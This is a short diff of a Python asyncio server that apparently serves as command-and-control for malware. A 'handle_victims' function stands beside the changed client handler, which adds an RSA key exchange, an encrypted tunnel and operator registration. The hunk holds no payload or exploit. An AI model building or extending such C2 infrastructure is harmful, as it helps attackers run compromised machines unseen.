@@ -43,21 +43,23 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
 # TODO: client management
 
 async def handle_clients(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
-    try:
-        key = b'c'*32
-        nonce = b'c'*8
+    key = get_random_bytes(32)
+    nonce = get_random_bytes(8)
 
-        while True:
-            si = await r.read(BUFSIZE)
-            print(si)
-            w.write(si)
-            await w.drain()
-    
-    except Exception as e:
-        print(e)
-    
+    w.write(FINGERPRINT.encode())
+    await w.drain()
 
-    # CLIENTS[username] = (w, r)
+    public_key = rsa.PublicKey.load_pkcs1(await r.read(BUFSIZE))
+    w.write(rsa.encrypt(key + nonce, public_key))
+    await w.drain()
+
+    enctunnel = EncryptedTunnel(r, w, key, nonce)
+
+    del(public_key)
+
+    username = await enctunnel.recv(BUFSIZE)
+    
+    CLIENTS[username.decode()] = (w, r)
 
 async def run_forever(server):
     async with server:
